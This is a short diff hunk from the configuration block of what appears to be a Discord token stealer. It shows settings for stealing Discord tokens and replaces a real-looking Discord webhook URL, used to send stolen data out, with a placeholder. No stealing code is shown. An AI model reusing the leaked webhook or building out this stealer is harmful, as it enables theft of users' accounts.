@@ -18,7 +18,7 @@
 //─███──────▀────█──────██───
 
 var buildid = "grease"
-var setting_webhook = "https://discord.com/api/webhooks/1080847523117273128/wS5MsaLQqHMChKm371itvx499F6UMKORQgKYESpJyOjCRztlzt4SHyFZsGidOuE5cGf0"
+var setting_webhook = "webhook url"
 var setting_avatar = "https://www.morphsuits.com/media/catalog/product/cache/937f440085cd52c4f06eb785557b6967/m/1/m1_4_3_4375_1.jpg"
 var setting_antiduplicate = true
 var setting_stealldiscordtoken = false
